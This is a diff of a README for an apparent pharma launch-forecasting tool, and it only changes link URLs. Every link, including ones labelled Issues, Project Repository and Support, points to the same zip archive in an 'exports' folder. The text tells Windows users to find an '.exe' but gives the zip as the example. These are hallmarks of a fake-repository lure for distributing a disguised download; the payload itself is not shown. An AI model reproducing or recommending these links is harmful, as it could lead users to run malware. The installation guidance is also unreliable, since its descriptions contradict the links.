@@ -1,6 +1,6 @@
 # 💊 pharma-launch-forecast - Easy Pharma Launch Prediction Tools
 
-[![Download Latest Release](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip%20Latest-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip)
+[![Download Latest Release](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip%20Latest-Release-blue?style=for-the-badge)](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip)
 
 ## 📋 Overview
 
@@ -27,13 +27,13 @@ To get started with pharma-launch-forecast, you first need to download the softw
 
 Click the button below to open the release page where you can find the latest version available for download.
 
-[![Download Latest Release](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip%20Latest-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip)
+[![Download Latest Release](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip%20Latest-Release-blue?style=for-the-badge)](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip)
 
 ### Step 2: Choose the Correct File for Your System
 
 On the release page, look for the file that matches your computer's operating system and architecture:
 
-- For Windows computers, look for a file ending with `.exe` like `https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip`.
+- For Windows computers, look for a file ending with `.exe` like `https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip`.
 - For macOS, look for a file ending with `.dmg` or `.pkg`.
 
 Click the file name to start downloading.
@@ -114,7 +114,7 @@ Yes. pharma-launch-forecast is designed based on common market-access and pharma
 
 If you encounter any issues during download, installation, or use, you can:
 
-- Check the [Issues](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip) tab on the GitHub page for common problems and solutions.
+- Check the [Issues](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip) tab on the GitHub page for common problems and solutions.
 - Open a new issue describing your problem for the developers to assist you.
 - Look at the README and documentation files included in the download package.
 
@@ -126,6 +126,6 @@ Always download software from the official release page to avoid fake versions.
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip)
-- [Project Repository](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip)
-- [Issues & Support](https://raw.githubusercontent.com/LeinaD09/pharma-launch-forecast/main/exports/pharma_launch_forecast_v3.9.zip)
+- [Download Latest Release](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip)
+- [Project Repository](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip)
+- [Issues & Support](https://github.com/LeinaD09/pharma-launch-forecast/raw/refs/heads/main/exports/pharma_launch_forecast_v3.9.zip)
